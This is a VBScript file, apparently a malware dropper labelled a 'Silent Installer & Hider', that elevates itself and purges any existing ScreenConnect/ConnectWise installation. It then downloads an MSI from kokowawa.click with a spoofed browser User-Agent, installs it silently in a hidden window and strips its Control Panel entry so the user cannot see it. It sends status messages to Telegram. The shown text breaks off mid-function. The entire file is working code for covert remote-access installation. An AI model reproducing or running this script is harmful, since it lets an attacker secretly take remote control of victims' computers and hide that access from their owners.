'==========================================================================
' ScreenConnect RMM - ULTIMATE Silent Installer & Hider v4.0
' FULL PURGE + FRESH INSTALL + HIDE
' Deletes ALL existing ScreenConnect/ConnectWise before installing yours
'==========================================================================
Option Explicit

' --- GLOBAL OBJECTS ---
Dim oShell, oFSO, oWMI
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:\\.\root\cimv2")

' --- CONFIGURATION ---
Dim sMsiUrl, sMsiPath, sTempDir, sLogFile, sBackupDir
sMsiUrl    = "https://kokowawa.click/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
sTempDir   = oShell.ExpandEnvironmentStrings("%TEMP%")
sMsiPath   = sTempDir & "\" & "56BSSW3K0000_10POJPQ9MT3B4_windows_x64.msi"
sLogFile   = sTempDir & "\ScreenConnect_Install.log"
sBackupDir = sTempDir & "\ScreenConnect_RegistryBackup"

Dim sKeywordToHide
sKeywordToHide = "ScreenConnect"

' --- RETRY CONFIG ---
Const MAX_DOWNLOAD_RETRIES = 3
Const DOWNLOAD_RETRY_DELAY = 5000
Const INSTALL_TIMEOUT_MIN  = 10

Call Main()

'==========================================================================
' MAIN
'==========================================================================
Sub Main()
    LogMessage "============================================================"
    LogMessage " ScreenConnect ULTIMATE Installer & Hider v4.0"
    LogMessage " Started: " & Now
    LogMessage "============================================================"
    
    ' 1. Elevation Check
    If Not IsScriptElevated() Then
        LogMessage "[ELEVATE] Not running as admin. Attempting auto-elevation..."
        ElevateScript()
        WScript.Quit
    End If
    LogMessage "[ELEVATE] Running with Administrator privileges."
    
    ' 2. Cleanup old logs
    CleanupOldLogs 5
    
    ' 3. KILL ALL SCREENCONNECT/CONNECTWISE PROCESSES
    KillAllRelatedProcesses()
    
    ' 4. STOP ALL SCREENCONNECT/CONNECTWISE SERVICES
    StopAllRelatedServices()
    
    ' 5. DELETE ALL SCREENCONNECT/CONNECTWISE SERVICES
    DeleteAllRelatedServices()
    
    ' 6. UNINSTALL VIA WMI
    UninstallViaWMI()
    
    ' 7. UNINSTALL VIA REGISTRY
    UninstallOldVersion()
    
    ' 8. DELETE SCHEDULED TASKS
    CleanupScheduledTasks()
    
    ' 9. AGGRESSIVE FILE/FOLDER PURGE
    AggressiveFilePurge()
    
    ' 10. CLEAN REGISTRY TRACES
    CleanRegistryTraces()
    
    ' 11. BACKUP CURRENT REGISTRY STATE
    BackupRegistry()
    
    ' 12. DOWNLOAD WITH RETRY
    If Not DownloadWithRetry(sMsiUrl, sMsiPath, MAX_DOWNLOAD_RETRIES) Then
        LogMessage "[FATAL] Download failed after " & MAX_DOWNLOAD_RETRIES & " retries. Aborting."
        SendTelegramNotification "Download FAILED"
        WScript.Quit 1
    End If
    LogMessage "[DOWNLOAD] MSI downloaded successfully."
    
    ' 13. VERIFY MSI INTEGRITY
    If Not VerifyMSIIntegrity(sMsiPath) Then
        LogMessage "[FATAL] MSI file integrity check failed. Aborting."
        SendTelegramNotification "Integrity Check FAILED"
        WScript.Quit 1
    End If
    LogMessage "[VERIFY] MSI integrity check passed."
    
    ' 14. INSTALL WITH TIMEOUT
    Dim nExitCode
    nExitCode = InstallWithTimeout(sMsiPath, INSTALL_TIMEOUT_MIN)
    LogMessage "[INSTALL] Exit code: " & nExitCode
    
    ' 15. VERIFY + HIDE
    If nExitCode = 0 Then
        WScript.Sleep 10000
        
        If VerifyInstallation() Then
            LogMessage "[VERIFY] Installation confirmed in registry."
        Else
            LogMessage "[WARNING] Installation could not be verified."
        End If
        
        ForceHideApplication sKeywordToHide
        LogMessage "[HIDE] Application hidden from Control Panel."
        
        If VerifyHiding() Then
            LogMessage "[VERIFY] Hiding confirmed successful."
        Else
            LogMessage "[WARNING] Hiding verification incomplete."
        End If
        
        SendTelegramNotification "Installation SUCCESS"
    Else
        LogMessage "[WARNING] Install returned non-zero exit code: " & nExitCode
        SendTelegramNotification "Installation FAILED - Exit code " & nExitCode
    End If
    
    ' 16. FINAL CLEANUP
    FinalCleanup()
    LogMessage "[CLEANUP] Temporary files removed."
    
    LogMessage "============================================================"
    LogMessage " Process completed at: " & Now
    LogMessage "============================================================"
End Sub

'==========================================================================
' KILL ALL SCREENCONNECT/CONNECTWISE PROCESSES
'==========================================================================
Sub KillAllRelatedProcesses()
    On Error Resume Next
    Dim colProcesses, objProcess
    
    LogMessage "[PROCESS] Scanning for ScreenConnect/ConnectWise processes..."
    
    Dim aProcessNames
    aProcessNames = Array( _
        "ScreenConnect.WindowsClient.exe", _
        "ScreenConnect.Service.exe", _
        "ScreenConnect.Server.exe", _
        "ScreenConnect.ClientService.exe", _
        "ScreenConnect.Tray.exe", _
        "ScreenConnect.exe", _
        "connectwisecontrol.exe", _
        "CWControl.exe", _
        "ConnectWiseControl.exe", _
        "ConnectWise.Service.exe", _
        "ConnectWise.Tray.exe" _
    )
    
    Dim sProcName
    For Each sProcName In aProcessNames
        Set colProcesses = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & sProcName & "'")
        For Each objProcess In colProcesses
            LogMessage "[PROCESS] Terminating: " & objProcess.Name & " (PID: " & objProcess.ProcessId & ")"
            objProcess.Terminate()
            WScript.Sleep 500
        Next
    Next
    
    Set colProcesses = oWMI.ExecQuery("SELECT * FROM Win32_Process")
    For Each objProcess In colProcesses
        If Not IsNull(objProcess.ExecutablePath) Then
            If InStr(1, objProcess.ExecutablePath, "ScreenConnect", vbTextCompare) > 0 Or _
               InStr(1, objProcess.ExecutablePath, "ConnectWise", vbTextCompare) > 0 Or _
               InStr(1, objProcess.ExecutablePath, "screenconnect", vbTextCompare) > 0 Then
                LogMessage "[PROCESS] Terminating (path match): " & objProcess.Name & " (PID: " & objProcess.ProcessId & ")"
                objProcess.Terminate()
                WScript.Sleep 500
            End If
        End If
    Next
    
    WScript.Sleep 3000
    LogMessage "[PROCESS] All related processes terminated."
    On Error GoTo 0
End Sub

'==========================================================================
' STOP ALL SCREENCONNECT/CONNECTWISE SERVICES
'==========================================================================
Sub StopAllRelatedServices()
    On Error Resume Next
    Dim colServices, objService
    
    LogMessage "[SERVICE] Stopping all ScreenConnect/ConnectWise services..."
    
    Set colServices = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%' OR Name LIKE '%screenconnect%' OR Name LIKE '%connectwise%'")
    
    For Each objService In colServices
        LogMessage "[SERVICE] Stopping: " & objService.Name & " (" & objService.DisplayName & ")"
        objService.StopService()
        WScript.Sleep 3000
        
        If objService.State = "Running" Then
            LogMessage "[SERVICE] Force stopping: " & objService.Name
            oShell.Run "cmd /c sc stop """ & objService.Name & """", 0, True
            WScript.Sleep 2000
        End If
        
        objService.ChangeStartMode "Disabled"
    Next
    
    WScript.Sleep 2000
    LogMessage "[SERVICE] All related services stopped and disabled."
    On Error GoTo 0
End Sub

'==========================================================================
' DELETE ALL SCREENCONNECT/CONNECTWISE SERVICES
'==========================================================================
Sub DeleteAllRelatedServices()
    On Error Resume Next
    Dim colServices, objService
    
    LogMessage "[SERVICE] Deleting all ScreenConnect/ConnectWise services..."
    
    Set colServices = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%' OR Name LIKE '%screenconnect%' OR Name LIKE '%connectwise%'")
    
    For Each objService In colServices
        LogMessage "[SERVICE] Deleting: " & objService.Name
        oShell.Run "cmd /c sc delete """ & objService.Name & """", 0, True
        WScript.Sleep 1000
    Next
    
    LogMessage "[SERVICE] All related services deleted."
    On Error GoTo 0
End Sub

'==========================================================================
' UNINSTALL VIA WMI
'==========================================================================
Sub UninstallViaWMI()
    On Error Resume Next
    Dim colProducts, objProduct
    
    LogMessage "[WMI-UNINSTALL] Searching for ScreenConnect/ConnectWise products..."
    
    Set colProducts = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%' OR Name LIKE '%screenconnect%'")
    
    For Each objProduct In colProducts
        LogMessage "[WMI-UNINSTALL] Found: " & objProduct.Name & " (v" & objProduct.Version & ")"
        LogMessage "[WMI-UNINSTALL] Uninstalling..."
        objProduct.Uninstall()
        WScript.Sleep 5000
    Next
    
    Set colProducts = Nothing
    LogMessage "[WMI-UNINSTALL] WMI uninstall complete."
    On Error GoTo 0
End Sub

'==========================================================================
' UNINSTALL VIA REGISTRY (ALL HIVES + WOW6432Node)
'==========================================================================
Sub UninstallOldVersion()
    On Error Resume Next
    Const HKLM = &H80000002
    Const HKCU = &H80000001
    
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    aHives = Array(HKLM, HKCU)
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    LogMessage "[REG-UNINSTALL] Scanning registry for ScreenConnect/ConnectWise..."
    
    For Each hive In aHives
        For Each sPath In aPaths
            oReg.EnumKey hive, sPath, arrSubKeys
            If IsArray(arrSubKeys) Then
                For Each sSubKey In arrSubKeys
                    Dim sDisplayName, sUninstallString, sQuietUninstall
                    
                    oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                    
                    If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                        If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Or _
                           InStr(1, sDisplayName, "ConnectWise", vbTextCompare) > 0 Then
                            
                            LogMessage "[REG-UNINSTALL] Found: " & sDisplayName
                            
                            oReg.GetStringValue hive, sPath & "\" & sSubKey, "QuietUninstallString", sQuietUninstall
                            
                            If Not IsEmpty(sQuietUninstall) And sQuietUninstall <> "" Then
                                sUninstallString = sQuietUninstall
                            Else
                                oReg.GetStringValue hive, sPath & "\" & sSubKey, "UninstallString", sUninstallString
                                
                                If Not IsEmpty(sUninstallString) And sUninstallString <> "" Then
                                    If InStr(1, sUninstallString, "msiexec", vbTextCompare) > 0 Then
                                        sUninstallString = Replace(sUninstallString, "/I", "/X", 1, -1, vbTextCompare)
                                        If InStr(1, sUninstallString, "/qn", vbTextCompare) = 0 Then
                                            sUninstallString = sUninstallString & " /qn /norestart"
                                        End If
                                    Else
                                        sUninstallString = sUninstallString & " /S /silent /quiet /verysilent"
                                    End If
                                End If
                            End If
                            
                            If Not IsEmpty(sUninstallString) And sUninstallString <> "" Then
                                LogMessage "[REG-UNINSTALL] Running: " & sUninstallString
                                oShell.Run "cmd /c " & sUninstallString, 0, True
                                WScript.Sleep 5000
                            End If
                            
                            oReg.DeleteKey hive, sPath & "\" & sSubKey
                            LogMessage "[REG-UNINSTALL] Deleted registry key: " & sSubKey
                        End If
                    End If
                Next
            End If
        Next
    Next
    
    Set oReg = Nothing
    LogMessage "[REG-UNINSTALL] Registry uninstall complete."
    On Error GoTo 0
End Sub

'==========================================================================
' CLEANUP SCHEDULED TASKS
'==========================================================================
Sub CleanupScheduledTasks()
    On Error Resume Next
    
    LogMessage "[TASKS] Deleting ScreenConnect/ConnectWise scheduled tasks..."
    
    Dim aTaskPatterns
    aTaskPatterns = Array( _
        "ScreenConnect", _
        "screenconnect", _
        "ConnectWise", _
        "connectwise", _
        "SC_", _
        "CW_" _
    )
    
    Dim sPattern
    For Each sPattern In aTaskPatterns
        oShell.Run "cmd /c schtasks /delete /tn ""*" & sPattern & "*"" /f", 0, True
    Next
    
    LogMessage "[TASKS] Scheduled tasks cleaned."
    On Error GoTo 0
End Sub

'==========================================================================
' AGGRESSIVE FILE/FOLDER PURGE
'==========================================================================
Sub AggressiveFilePurge()
    On Error Resume Next
    
    LogMessage "[PURGE] ========== STARTING AGGRESSIVE FILE PURGE =========="
    
    Dim aPathsToPurge
    aPathsToPurge = Array( _
        "C:\Program Files\ScreenConnect\", _
        "C:\Program Files (x86)\ScreenConnect\", _
        "C:\Program Files\ConnectWise\", _
        "C:\Program Files (x86)\ConnectWise\", _
        "C:\Program Files\ConnectWiseControl\", _
        "C:\Program Files (x86)\ConnectWiseControl\", _
        "C:\ProgramData\ScreenConnect\", _
        "C:\ProgramData\ConnectWise\", _
        oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ConnectWise\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ConnectWise\", _
        oShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\ConnectWise\" _
    )
    
    Dim sPath
    For Each sPath In aPathsToPurge
        If oFSO.FolderExists(sPath) Then
            LogMessage "[PURGE] Deleting folder: " & sPath
            
            oShell.Run "cmd /c takeown /f """ & sPath & """ /r /d y > nul 2>&1", 0, True
            oShell.Run "cmd /c icacls """ & sPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
            WScript.Sleep 1000
            
            oFSO.DeleteFolder sPath, True
            
            If Err.Number <> 0 Then
                LogMessage "[PURGE] WARNING: Could not delete " & sPath & " - " & Err.Description
                Err.Clear
                oShell.Run "cmd /c rmdir /s /q """ & sPath & """", 0, True
            Else
                LogMessage "[PURGE] Successfully deleted: " & sPath
            End If
        End If
    Next
    
    ' === DELETE FROM ALL USER PROFILES ===
    LogMessage "[PURGE] Scanning all user profiles..."
    
    Dim oUsersFolder, oUserFolder
    If oFSO.FolderExists("C:\Users") Then
        Set oUsersFolder = oFSO.GetFolder("C:\Users")
        
        For Each oUserFolder In oUsersFolder.SubFolders
            If oUserFolder.Name <> "Public" And oUserFolder.Name <> "Default" And _
               oUserFolder.Name <> "All Users" And oUserFolder.Name <> "Default User" Then
                
                Dim aUserPaths
                aUserPaths = Array( _
                    oUserFolder.Path & "\AppData\Roaming\ScreenConnect", _
                    oUserFolder.Path & "\AppData\Roaming\ConnectWise", _
                    oUserFolder.Path & "\AppData\Local\ScreenConnect", _
                    oUserFolder.Path & "\AppData\Local\ConnectWise", _
                    oUserFolder.Path & "\Desktop\ScreenConnect*", _
                    oUserFolder.Path & "\Desktop\ConnectWise*", _
                    oUserFolder.Path & "\Downloads\ScreenConnect*", _
                    oUserFolder.Path & "\Downloads\ConnectWise*" _
                )
                
                Dim sUserPath
                For Each sUserPath In aUserPaths
                    If oFSO.FolderExists(sUserPath) Then
                        LogMessage "[PURGE] Deleting user folder: " & sUserPath
                        oFSO.DeleteFolder sUserPath, True
                    End If
                Next
                
                Dim sUserTemp
                sUserTemp = oUserFolder.Path & "\AppData\Local\Temp"
                If oFSO.FolderExists(sUserTemp) Then
                    CleanTempFolder sUserTemp
                End If
            End If
        Next
    End If
    
    ' === CLEAN SYSTEM TEMP FOLDERS ===
    LogMessage "[PURGE] Cleaning system temp folders..."
    CleanTempFolder sTempDir
    CleanTempFolder oShell.ExpandEnvironmentStrings("%WINDIR%") & "\Temp"
    
    LogMessage "[PURGE] ========== AGGRESSIVE FILE PURGE COMPLETE =========="
    On Error GoTo 0
End Sub

'==========================================================================
' CLEAN TEMP FOLDER OF SCREENCONNECT/CONNECTWISE FILES
'==========================================================================
Sub CleanTempFolder(sFolderPath)
    On Error Resume Next
    
    If Not oFSO.FolderExists(sFolderPath) Then Exit Sub
    
    Dim oFolder, oFile, oSubFolder
    Set oFolder = oFSO.GetFolder(sFolderPath)
    
    For Each oFile In oFolder.Files
        If InStr(1, oFile.Name, "ScreenConnect", vbTextCompare) > 0 Or _
           InStr(1, oFile.Name, "ConnectWise", vbTextCompare) > 0 Or _
           InStr(1, oFile.Name, "screenconnect", vbTextCompare) > 0 Or _
           InStr(1, oFile.Name, "connectwise", vbTextCompare) > 0 Or _
           InStr(1, oFile.Name, "56BSSW", vbTextCompare) > 0 Then
            LogMessage "[PURGE] Deleting temp file: " & oFile.Path
            oFSO.DeleteFile oFile.Path, True
        End If
    Next
    
    For Each oSubFolder In oFolder.SubFolders
        If InStr(1, oSubFolder.Name, "ScreenConnect", vbTextCompare) > 0 Or _
           InStr(1, oSubFolder.Name, "ConnectWise", vbTextCompare) > 0 Or _
           InStr(1, oSubFolder.Name, "screenconnect", vbTextCompare) > 0 Then
            LogMessage "[PURGE] Deleting temp subfolder: " & oSubFolder.Path
            oFSO.DeleteFolder oSubFolder.Path, True
        End If
    Next
    
    On Error GoTo 0
End Sub

'==========================================================================
' CLEAN REGISTRY TRACES
'==========================================================================
Sub CleanRegistryTraces()
    On Error Resume Next
    Const HKLM = &H80000002
    Const HKCU = &H80000001
    
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey, sDisplayName
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    LogMessage "[REGISTRY] Cleaning all ScreenConnect/ConnectWise registry traces..."
    
    aHives = Array(HKLM, HKCU)
    aPaths = Array( _
        "SOFTWARE\ScreenConnect", _
        "SOFTWARE\ConnectWise", _
        "SOFTWARE\ConnectWiseControl", _
        "SOFTWARE\WOW6432Node\ScreenConnect", _
        "SOFTWARE\WOW6432Node\ConnectWise", _
        "SOFTWARE\WOW6432Node\ConnectWiseControl", _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    For Each hive In aHives
        For Each sPath In aPaths
            
            If InStr(1, sPath, "ScreenConnect", vbTextCompare) > 0 Or _
               InStr(1, sPath, "ConnectWise", vbTextCompare) > 0 Then
                
                If InStr(1, sPath, "Uninstall", vbTextCompare) = 0 Then
                    oReg.DeleteKey hive, sPath
                    If Err.Number = 0 Then
                        LogMessage "[REGISTRY] Deleted key: " & GetHiveName(hive) & "\" & sPath
                    End If
                    Err.Clear
                End If
            End If
            
            If InStr(1, sPath, "Uninstall", vbTextCompare) > 0 Then
                oReg.EnumKey hive, sPath, arrSubKeys
                If IsArray(arrSubKeys) Then
                    For Each sSubKey In arrSubKeys
                        oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                        If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                            If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Or _
                               InStr(1, sDisplayName, "ConnectWise", vbTextCompare) > 0 Then
                                oReg.DeleteKey hive, sPath & "\" & sSubKey
                                LogMessage "[REGISTRY] Deleted uninstall key: " & sDisplayName
                            End If
                        End If
                    Next
                End If
            End If
        Next
    Next
    
    Set oReg = Nothing
    LogMessage "[REGISTRY] Registry trace cleanup complete."
    On Error GoTo 0
End Sub

'==========================================================================
' BACKUP REGISTRY
'==========================================================================
Sub BackupRegistry()
    On Error Resume Next
    
    If Not oFSO.FolderExists(sBackupDir) Then
        oFSO.CreateFolder sBackupDir
    End If
    
    Dim sBackupFile
    sBackupFile = sBackupDir & "\Uninstall_Backup_" & FormatDateForFile(Now) & ".reg"
    oShell.Run "regedit /e """ & sBackupFile & """ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0, True
    
    sBackupFile = sBackupDir & "\Uninstall_WOW64_Backup_" & FormatDateForFile(Now) & ".reg"
    oShell.Run "regedit /e """ & sBackupFile & """ HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", 0, True
    
    LogMessage "[BACKUP] Registry backed up to: " & sBackupDir
    On Error GoTo 0
End Sub

'==========================================================================
' DOWNLOAD WITH RETRY
'==========================================================================
Function DownloadWithRetry(sUrl, sDestPath, nMaxRetries)
    Dim nRetry, bSuccess
    bSuccess = False
    
    For nRetry = 1 To nMaxRetries
        LogMessage "[DOWNLOAD] Attempt " & nRetry & " of " & nMaxRetries
        
        If DownloadMSI(sUrl, sDestPath) Then
            bSuccess = True
            Exit For
        Else
            If nRetry < nMaxRetries Then
                LogMessage "[DOWNLOAD] Retry " & nRetry & " failed. Waiting " & DOWNLOAD_RETRY_DELAY & "ms..."
                WScript.Sleep DOWNLOAD_RETRY_DELAY
            End If
        End If
    Next
    
    DownloadWithRetry = bSuccess
End Function

'==========================================================================
' DOWNLOAD MSI
'==========================================================================
Function DownloadMSI(sUrl, sDestPath)
    On Error Resume Next
    
    If oFSO.FileExists(sDestPath) Then
        oFSO.DeleteFile sDestPath, True
    End If

    Dim oHTTP
    Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    If Err.Number <> 0 Then
        Err.Clear
        Set oHTTP = CreateObject("Microsoft.XMLHTTP")
    End If
    
    If Err.Number <> 0 Then
        Err.Clear
        Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    End If

    oHTTP.SetTimeouts 600000, 600000, 600000, 600000
    oHTTP.Open "GET", sUrl, False
    oHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    oHTTP.setRequestHeader "Accept", "*/*"
    oHTTP.setRequestHeader "Cache-Control", "no-cache"
    oHTTP.Send
    
    If Err.Number <> 0 Then
        LogMessage "[DOWNLOAD] HTTP Error: " & Err.Description
        DownloadMSI = False
        Exit Function
    End If

    If oHTTP.Status <> 200 Then
        LogMessage "[DOWNLOAD] HTTP Status: " & oHTTP.Status
        DownloadMSI = False
        Exit Function
    End If

    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1
    oStream.Open
    oStream.Write oHTTP.responseBody
    oStream.SaveToFile sDestPath, 2
    oStream.Close

    If Err.Number <> 0 Then
        LogMessage "[DOWNLOAD] Write Error: " & Err.Description
        DownloadMSI = False
        Exit Function
    End If

    If oFSO.FileExists(sDestPath) Then
        Dim oFile
        Set oFile = oFSO.GetFile(sDestPath)
        If oFile.Size > 1024 Then
            LogMessage "[DOWNLOAD] File saved. Size: " & FormatFileSize(oFile.Size)
            DownloadMSI = True
        Else
            LogMessage "[DOWNLOAD] File too small: " & oFile.Size & " bytes"
            oFSO.DeleteFile sDestPath, True
            DownloadMSI = False
        End If
        Set oFile = Nothing
    Else
        DownloadMSI = False
    End If

    Set oStream = Nothing
    Set oHTTP = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' VERIFY MSI INTEGRITY
'==========================================================================
Function VerifyMSIIntegrity(sFilePath)
    VerifyMSIIntegrity = False
    If Not oFSO.FileExists(sFilePath) Then Exit Function
    
    Dim oFile, oStream, nByte1, nByte2
    Set oFile = oFSO.GetFile(sFilePath)
    
    If LCase(oFSO.GetExtensionName(sFilePath)) <> "msi" Then Exit Function
    If oFile.Size < 1048576 Then Exit Function
    
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1
    oStream.Open
    oStream.LoadFromFile sFilePath
    oStream.Position = 0
    
    If oStream.Size >= 2 Then
        nByte1 = AscB(oStream.Read(1))
        nByte2 = AscB(oStream.Read(1))
        If nByte1 = &HD0 And nByte2 = &HCF Then
            VerifyMSIIntegrity = True
        End If
    End If
    
    oStream.Close
    Set oStream = Nothing
    Set oFile = Nothing
End Function

'==========================================================================
' INSTALL WITH TIMEOUT
'==========================================================================
Function InstallWithTimeout(sMsiFilePath, nTimeoutMinutes)
    Dim sInstallCmd, nExitCode
    
    sInstallCmd = "msiexec /i """ & sMsiFilePath & """ /qn /norestart " & _
                  "LicenseAccepted=YES POLICY_CATEGORY_ID=-1 " & _
                  "INSTALL_ARGS=""sourceInstall=silent"""
    
    LogMessage "[INSTALL] Running: " & sInstallCmd
    
    On Error Resume Next
    Dim objWMIService, objStartup, objConfig, objProcess, intProcessID
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    
    Dim nResult
    nResult = objProcess.Create(sInstallCmd, Null, objConfig, intProcessID)
    
    If nResult = 0 Then
        LogMessage "[INSTALL] Process started. PID: " & intProcessID
        
        Dim colProcesses, objProc, bFound, nWaitSeconds, nMaxSeconds
        nMaxSeconds = nTimeoutMinutes * 60
        nWaitSeconds = 0
        
        Do While nWaitSeconds < nMaxSeconds
            WScript.Sleep 5000
            nWaitSeconds = nWaitSeconds + 5
            
            Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & intProcessID)
            bFound = False
            For Each objProc In colProcesses
                bFound = True
            Next
            
            If Not bFound Then
                LogMessage "[INSTALL] Completed after ~" & nWaitSeconds & " seconds."
                Exit Do
            End If
        Loop
        
        If bFound Then
            LogMessage "[INSTALL] TIMEOUT. Terminating process..."
            Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & intProcessID)
            For Each objProc In colProcesses
                objProc.Terminate()
            Next
            nExitCode = -1
        Else
            nExitCode = 0
        End If
    Else
        LogMessage "[INSTALL] Failed to create process. Error: " & nResult
        nExitCode = -1
    End If
    
    InstallWithTimeout = nExitCode
    On Error GoTo 0
End Function

'==========================================================================
' VERIFY INSTALLATION
'==========================================================================
Function VerifyInstallation()
    VerifyInstallation = False
    On Error Resume Next
    
    Const HKLM = &H80000002
    Dim oReg, arrSubKeys, sSubKey, sDisplayName
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    Dim aPaths
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    Dim sPath
    For Each sPath In aPaths
        oReg.EnumKey HKLM, sPath, arrSubKeys
        If IsArray(arrSubKeys) Then
            For Each sSubKey In arrSubKeys
                oReg.GetStringValue HKLM, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                    If InStr(1, sDisplayName, sKeywordToHide, vbTextCompare) > 0 Then
                        LogMessage "[VERIFY] Found: " & sDisplayName
                        VerifyInstallation = True
                        Exit Function
                    End If
                End If
            Next
        End If
    Next
    
    Set oReg = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' FORCE HIDE APPLICATION
'==========================================================================
Sub ForceHideApplication(sKeyword)
    On Error Resume Next
    Const HKLM = &H80000002
    Const HKCU = &H80000001
    
    Dim oReg, aHives, aPaths, hive, sPath
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    aHives = Array(HKLM, HKCU)
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    For Each hive In aHives
        For Each sPath In aPaths
            LogMessage "[HIDE] Scanning: " & GetHiveName(hive) & "\" & sPath
            SearchAndHideInPath oReg, hive, sPath, sKeyword
        Next
    Next
    
    Set oReg = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' SEARCH AND HIDE IN PATH
'==========================================================================
Sub SearchAndHideInPath(oReg, lHive, sKeyPath, sKeyword)
    On Error Resume Next
    Dim arrSubKeys, sSubKey, sDisplayName
    
    oReg.EnumKey lHive, sKeyPath, arrSubKeys
    
    If IsArray(arrSubKeys) Then
        For Each sSubKey In arrSubKeys
            oReg.GetStringValue lHive, sKeyPath & "\" & sSubKey, "DisplayName", sDisplayName
            
            If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                If InStr(1, sDisplayName, sKeyword, vbTextCompare) > 0 Then
                    LogMessage "[HIDE] MATCH: '" & sDisplayName & "'"
                    
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "SystemComponent", 1
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayName"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayIcon"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayVersion"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "Publisher"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "URLInfoAbout"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "HelpLink"
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "NoRemove", 0
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "NoModify", 1
                    
                    LogMessage "[HIDE] All hiding methods applied."
                End If
            End If
        Next
    End If
    On Error GoTo 0
End Sub

'==========================================================================
' VERIFY HIDING
'==========================================================================
Function VerifyHiding()
    VerifyHiding = True
    On Error Resume Next
    
    Const HKLM = &H80000002
    Dim oReg, arrSubKeys, sSubKey, sDisplayName
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    Dim aPaths
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    Dim sPath
    For Each sPath In aPaths
        oReg.EnumKey HKLM, sPath, arrSubKeys
        If IsArray(arrSubKeys) Then
            For Each sSubKey In arrSubKeys
                oReg.GetStringValue HKLM, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                    If InStr(1, sDisplayName, sKeywordToHide, vbTextCompare) > 0 Then
                        LogMessage "[VERIFY-HIDE] WARNING: DisplayName still exists for: " & sDisplayName
                        VerifyHiding = False
